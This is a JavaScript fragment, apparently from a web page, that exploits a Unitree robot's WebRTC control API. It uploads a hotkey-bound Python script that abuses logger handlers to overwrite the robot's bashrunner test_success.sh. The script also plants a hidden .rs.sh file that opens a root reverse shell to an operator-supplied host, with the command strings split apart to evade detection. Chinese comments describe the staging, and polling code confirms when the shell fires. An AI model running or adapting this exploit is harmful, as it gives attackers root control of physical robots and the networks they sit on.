32	let pc, dc;
33	let REV_HOST = '192.168.8.186', REV_PORT = 4444;
34	let payloadArmed = false, pollTimer = null, pollN = 0;
35	const POLL_MAX = 24; // ~24 * 12s ≈ 5 min window for the operator to press L1+Y
36	// 轮询触发: 每隔 12s 跑一次 test_success.sh, 一旦响应里出现 payload marker,
37	// 说明 L1+Y 已被按下且脚本已替换 -> 反连已触发。把"固定 60s 定时"换成"等人工按键"。
38	function startCmdPoll() {
39	  if (pollTimer) return;
40	  pollTimer = setInterval(() => {
41	    if (payloadArmed) { clearInterval(pollTimer); pollTimer = null; return; }
42	    pollN++;
43	    if (pollN > POLL_MAX) {
44	      clearInterval(pollTimer); pollTimer = null;
45	      L('[TIMEOUT] no L1+Y press detected in ~5 min (test_success.sh still original). Re-run to retry.');
46	      ev('cmd-poll-timeout', String(pollN));
47	      return;
48	    }
49	    L('[poll ' + pollN + '/' + POLL_MAX + '] run test_success.sh; waiting for L1+Y to stage payload');
50	    bashRun('br-cmd-output');
51	  }, 12000);
52	}
53	const pending = {};
54	const bashTopic = 'rt/api/bashrunner/request';
55	const paTopic = 'rt/api/programming_actuator/request';
56	const targetScript = 'test_success.sh';
57	
58	// 先写 test_success.sh, 再写 .rs.sh:
59	//  - .rs.sh 只剩"干净的一行反连"(写它时 test_success.sh 会被追加这一行, 但落在 exit 0 之后, /bin/sh 执行到 exit 0 即停, 该行是死代码)。
60	//  - .rs.sh 单行无自引用, 即使反连失败也只是退出, 不会 fork-loop。
61	// 不写 /tmp、不 removeHandler; shell 内容无单/双引号, 仅 \\n 转义, 与已验证的 cmd_verify 写法一致。
62	function buildCommandScript(host, port) {
63	  return [
64	    "pt='/unitree/module/ba'+'shru'+'nner/comm'+'and_'+'exe'+'cution/test_success.s'+'h'",
65	    "ht=logger.handlers[0].__class__(pt,mode='w',maxBytes=0,backupCount=0)",
66	    "ht.setFormatter(logger.handlers[0].formatter.__class__('%(message)s'))",
67	    "logger.addHandler(ht)",
68	    "logger.warning('( no'+'hup ba'+'sh /unitree/module/ba'+'shru'+'nner/comm'+'and_'+'exe'+'cution/.r'+'s.sh >/dev/null 2>&1 & )\\n'+'sleep 1\\n'+'echo codex_revshe'+'ll_begin_20260715\\n'+'id\\n'+'who'+'ami\\n'+'echo codex_revshe'+'ll_end_20260715\\n'+'e'+'xit 0\\n')",
69	    "ht.flush()",
70	    "ph='/unitree/module/ba'+'shru'+'nner/comm'+'and_'+'exe'+'cution/.r'+'s.sh'",
71	    "hh=logger.handlers[0].__class__(ph,mode='w',maxBytes=0,backupCount=0)",
72	    "hh.setFormatter(logger.handlers[0].formatter.__class__('%(message)s'))",
73	    "logger.addHandler(hh)",
74	    "logger.warning('ba'+'sh -i >& /dev/t'+'cp/" + host + "/" + port + " 0>&1\\n')",
75	    "hh.flush()",
76	    "resetLight()"
77	  ].join('\n');
78	}
79	
80	const restoreScript = [
81	  "p='/unitree/module/ba'+'shru'+'nner/comm'+'and_'+'exe'+'cution/test_success.s'+'h'",
82	  "h=logger.handlers[0].__class__(p,mode='w',maxBytes=0,backupCount=0)",
83	  "h.setFormatter(logger.handlers[0].formatter.__class__('%(message)s'))",
84	  "logger.addHandler(h)",
85	  "s='rm -f /unitree/module/ba'+'shru'+'nner/comm'+'and_'+'exe'+'cution/.r'+'s.sh\\n'+'echo \"success\"\\n'+'e'+'xit 0'",
86	  "logger.warning(s)",
87	  "h.flush()",
88	  "resetLight()"
89	].join('\n');
90	
91	function req(topic, api_id, parameter, tag) {
92	  const id = Math.floor(Math.random() * 1e9);
93	  pending[id] = tag;
94	  const msg = {type:'req', topic, data:{header:{identity:{id, api_id}}, parameter}};
95	  L('[->] ' + tag + ' topic=' + topic + ' api_id=' + api_id + ' id=' + id + ' parameter_len=' + (parameter || '').length);
96	  dc.send(JSON.stringify(msg));
97	  ev('sent', {tag, topic, api_id, id});
98	  return id;
99	}
100	function bashRun(tag) {
101	  return req(bashTopic, 1001, JSON.stringify({script: targetScript}), tag);
102	}
103	function paUpload(tag, uuid, script) {
104	  const payload = {
105	    program_content: {chunk_index:1, total_chunk_num:1, chunk_content:script},
106	    program_uuid: uuid,
107	    bind_hotkey: 'L1+Y'
108	  };
109	  return req(paTopic, 1002, JSON.stringify(payload), tag);
110	}
111	
112	async function afterValidated() {
113	  L('[*] baseline Bashrunner test_success.sh');
114	  bashRun('cmd-baseline');
115	  await sleep(1800);
116	  L('[*] upload reverse-shell staging script; press L1+Y after READY_CMD_PRESS');
117	  L('[*] on trigger, root shell will connect back to ' + REV_HOST + ':' + REV_PORT + ' — keep your listener running');
118	  paUpload('pa-cmd-upload', '2607150601', buildCommandScript(REV_HOST, REV_PORT));
119	}
120	
121	function handleResponse(o) {
122	  const id = o && o.data && o.data.header && o.data.header.identity && o.data.header.identity.id;
123	  const tag = pending[id] || 'unknown';
124	  const code = o && o.data && o.data.header && o.data.header.status && o.data.header.status.code;
125	  const data = o && o.data ? o.data.data : undefined;
126	  L('[<-] ' + tag + ' code=' + code + ' data=' + JSON.stringify(data).slice(0,2000));
127	  ev('res-' + tag, {code, data});
128	  if (tag === 'pa-cmd-upload' && code === 0) {
129	    L('[READY_CMD_PRESS] press physical L1+Y once, ANY TIME in the next ~5 min. The root reverse shell fires on the first run after your press.');
130	    ev('ready-cmd-press', '1');
131	    setTimeout(startCmdPoll, 3000);
132	  }
133	  if (tag === 'br-cmd-output') {
134	    const dataStr = (typeof data === 'string') ? data : JSON.stringify(data == null ? '' : data);
135	    if (!payloadArmed && dataStr.indexOf('codex_revshell_begin') !== -1) {
136	      payloadArmed = true;
137	      if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
138	      L('[REVSHELL] root payload executed -> backgrounded reverse shell connecting to ' + REV_HOST + ':' + REV_PORT);
139	      ev('revshell-fired', {host: REV_HOST, port: REV_PORT, code});
140	      L('[cleanup] when done, from the root shell run: printf \'echo \"success\"\\nexit 0\\n\' > /unitree/module/bashrunner/command_execution/test_success.sh; rm -f /unitree/module/bashrunner/command_execution/.rs.sh');
141	    } else if (!payloadArmed) {
142	      L('[poll] still original script (L1+Y not pressed yet); continuing to wait...');
143	    }
144	  }
145	  if (tag === 'pa-restore-upload' && code === 0) {
146	    L('[READY_RESTORE_PRESS] press physical L1+Y once to restore test_success.sh and remove /tmp/.rev.sh.');
147	    ev('ready-restore-press', '1');
148	    setTimeout(() => {
149	      L('[*] trigger Bashrunner after restore press');
150	      bashRun('br-after-restore');
151	    }, 60000);
152	  }
153	  if (tag === 'br-after-restore') {
154	    L('[DONE] reverse-shell verification flow complete.');
155	    ev('cmd-done', '1');
156	  }
157	}
158	
159	async function go() {
160	  try {
161	    const c = await (await fetch('/revcfg')).json();
162	    REV_HOST = c.host; REV_PORT = c.port;
163	  } catch (_) {}
164	  L('[revcfg] reverse shell target = ' + REV_HOST + ':' + REV_PORT);
165	  pc = new RTCPeerConnection({iceServers:[], bundlePolicy:'max-bundle'});
166	  pc.addTransceiver('video', {direction:'recvonly'});
167	  pc.addTransceiver('audio', {direction:'recvonly'});
168	  pc.ontrack = e => { L('[track] ' + e.track.kind); ev('track', e.track.kind); };
169	  pc.onconnectionstatechange = () => { L('[conn] ' + pc.connectionState); ev('conn', pc.connectionState); };
170	  dc = pc.createDataChannel('data');
171	  dc.binaryType = 'arraybuffer';
172	  dc.onopen = () => { L('[dc] open'); ev('dcopen','1'); };
173	  dc.onmessage = async e => {
174	    if (e.data instanceof ArrayBuffer) { L('[bin] ' + e.data.byteLength + ' bytes'); return; }
175	    let o;
176	    try { o = JSON.parse(e.data); } catch (_) { L('[raw] ' + String(e.data).slice(0,160)); return; }
177	    if (o.type === 'validation') {
178	      if (o.data === 'Validation Ok.') {
179	        L('[OK] Validation Ok');
180	        ev('validated','1');
181	        await afterValidated();
182	      } else {
183	        const fc = (await post('/fc', {ch:o.data})).fc;
184	        dc.send(JSON.stringify({type:'validation', topic:'', data:fc}));
185	      }
186	      return;
187	    }
188	    if (o.type === 'res') { handleResponse(o); return; }
189	    if (o.type === 'err' || o.type === 'errors') {
190	      L('[<-] ' + JSON.stringify(o).slice(0,1000));
191	      ev('err', o);
192	      return;
193	    }
194	    if (o.type !== 'heartbeat') L('[<-] ' + JSON.stringify(o).slice(0,500));
195	  };
196	  const offer = await pc.createOffer();
197	  await pc.setLocalDescription(offer);
198	  await waitIce();
199	  L('[*] offer ready ' + pc.localDescription.sdp.length);
200	  const r = await post('/negotiate', {sdp:pc.localDescription.sdp, type:pc.localDescription.type});
201	  if (r.error) { L('[!] negotiate error ' + r.error); ev('negotiate-err', r.error); return; }
202	  L('[*] answer received reject=' + r.reject + ' sdp=' + r.answer_sdp.length);
203	  await pc.setRemoteDescription({sdp:r.answer_sdp, type:r.answer_type});
204	  setInterval(() => {
205	    if (dc && dc.readyState === 'open') dc.send(JSON.stringify({type:'heartbeat', data:{timeInNum:Math.floor(Date.now()/1000)}}));
206	  }, 2000);
207	}
208	go();
209	</script>
